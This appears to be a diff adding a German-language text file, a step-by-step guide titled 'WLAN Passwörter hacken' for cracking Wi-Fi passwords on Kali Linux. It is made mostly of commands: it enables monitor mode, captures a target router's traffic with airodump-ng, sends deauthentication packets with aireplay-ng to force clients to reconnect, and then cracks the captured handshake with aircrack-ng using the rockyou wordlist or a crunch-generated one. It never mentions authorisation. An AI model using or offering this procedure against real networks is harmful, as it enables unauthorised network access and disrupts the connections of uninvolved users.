@@ -1,0 +1,119 @@
+
+
+
+
+
+
+WLAN Passwörter hacken
+
+Betriebssystem: Kali Linux
+Es ist nicht zwingend notwendig Kali Linux zu nutzen, allerdings sind bei Kali Linux die notwendigen Programme bereits vorinstalliert.
+
+
+WICHTIG:
+Bei den Bezeichnungen der WLAN-Module kann es zu Abweichungen kommmen.
+"mon" steht für den Monitor-Mode, daher wird in diesem Fall bei den Befehlen immer "Wlan0mon" NACH DER AKTIVIERUNG DES MONITOR-MODUS verwendet !
+
+
+
+
+Schritt 1
+
+$ ifconfig
+$ iwconfig
+$ sudo airmon-ng check
+$ sudo airmon-ng check kill
+$ sudo airmon-ng start wlan0
+
+
+Schritt 2
+
+In einem belibigen Verzeichnis (z.B. ~ Dokumente) einen Ordner anlegen und das Terminal in diesem Ornder öffnen.
+Somit werden alle Datein automatisch in diesem Ordner gespeichert.
+
+
+Schritt 3
+
+$ sudo airodump-ng wlan0mon
+
+----
+so würde ein gewünschter output aussehen:
+SSID	AUTH		ENC		CH	BSSID (MAC)	MB
+
+Name	Verifizierung	z.B.WPA2	Zahl	MAC-Aresse	Zahl
+----
+(mit ^C beenden)
+
+Mit diesm Befehl kann ein bestimmtes WLAN beobachtet werden:
+$ sudo airodump-ng wlan0mon -d *HIER DIE MAC-ADRESSE DES WLAN-ROUTERS*
+
+
+Nun muss ein belibiges Gerät mit dem WLAN verbunden werden, damit Packete übertragen werden:
+(Es sollte eine Packetanzahl unter dem Punkt "Lost" zu sehen sein, während dem Aufbauen der WLAN Verbindung)
+$ sudo airodump-ng -w hack1 -c 1 --bssid *HIER DIE MAC-ADRESSE DES WLAN-ROUTERS* wlan0mon
+
+Optional: Um zu erzwingen, dass sich Geräte mit dem WLAN-ROUTER neu verbinden müssen:
+$ sudo aireplay-ng --deauth 0 -a *HIER DIE MAC-ADRESSE DES WLAN-ROUTERS* wlan0mon
+
+
+
+Wenn alles korrekt funktioniert hat und richtig ausgeführt wurde, sollten nun die Pakete abgefangen sein und das Passwort kann ermittelt werden.
+
+-----------------------------------------------------------------------
+
+Schritt 4 - Wireshark
+
+In dem eigen angelegten Ordner:
+
+$ ls
+$ wireshark hack1-01.cap
+
+
+
+
+Schritt 5
+
+stop monitor mode:
+
+$ iwconfig
+$ sudo airmon-ng stop wlan0mon
+
+Sollte nach dem deaktivieren keine Möglichkeit mehr bestehen, sich mit einem WLAN zu verbinden, muss das Gerät ggf. neu gestartet werden.
+
+
+
+Schritt 6
+
+unzip rockyou.txt.gz in dem wordlist Verzeichnis von Kali Linux
+
+$ locate rockyou
+$ cd *hier das Verzeichnis*
+$ sudo gzip -d rockyou.txt.gz
+$ ls
+
+$ aircrack-ng hack1-01.cap -w rockyou.txt
+
+
+Nun wird das Passwort ermittelt, je nach Stärke & Länge des Passwortes und der Leistung des PCs kann die dafür beötigte Zeit abweichen.
+
+
+-------------------------------------
+Erstellen einer eigenen Wordlist (hilfreich, wenn z.B. Länge und/oder die verwendeten Zeichen bekannt sind)
+
+Optional kann auch eine eigene Wordlist angelegt werden, wenn z.B. bekannt ist, wie viele Zeichen min./max. und welche Zeichen genutzt werden. 
+In diesem Beispiel würde mit diesem Befehl eine Worlist erstellt werden, wo jedes Passwort 9 Zeichen lang ist und aus den Buchstaben "abc" besteht.
+
+Hinweis: Die Dauer sowie der benötigte Speicherplatz bei der Erstellung der Wordlist kann je nach Anzahl der Optionen (Länge, verwendete Buchstaben etc.) abweichen, 
+hier also sicherstellen, dass genügend Speicher vorhanden ist.
+
+
+$ crunch 9 9 abc -o wordlist-abc.lst
+
+
+Den handshake mit der eigenen Wordlist ausführen:
+$ aircrack-ng hack1-01.cap -w wordlist-abc.lst
+
+
+
+
+
